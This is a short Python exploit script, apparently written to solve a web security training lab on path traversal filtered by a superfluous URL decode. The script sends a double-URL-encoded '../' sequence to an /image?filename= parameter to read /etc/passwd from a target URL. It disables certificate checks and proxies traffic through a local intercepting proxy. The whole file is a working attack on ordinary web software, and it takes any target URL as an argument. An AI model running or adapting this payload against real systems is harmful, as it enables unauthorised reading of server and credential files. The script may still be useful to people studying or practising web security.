import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def path_traversal_exploit(url):
    filename_path_exploit = '/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564'
    r = requests.get(url + filename_path_exploit, verify=False, proxies=proxies)
    if (r.status_code == 200):
        print("(+) Exploit successful")
        print("(+) The following is the content of the /etc/passwd file:")
        print(r.text)
        sys.exit(0)
    else:
        print("(-) Exploit faild")
        sys.exit(2)
    
def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <URL>")
        print(f"(+) Example Usage: {sys.argv[0]} \"www.domain.com\"")
        sys.exit(1)
    
    url = sys.argv[1]
    print(">>> File path traversal, traversal sequences stripped with superfluous URL-decode")
    path_traversal_exploit(url)

if __name__ == "__main__":
    main()
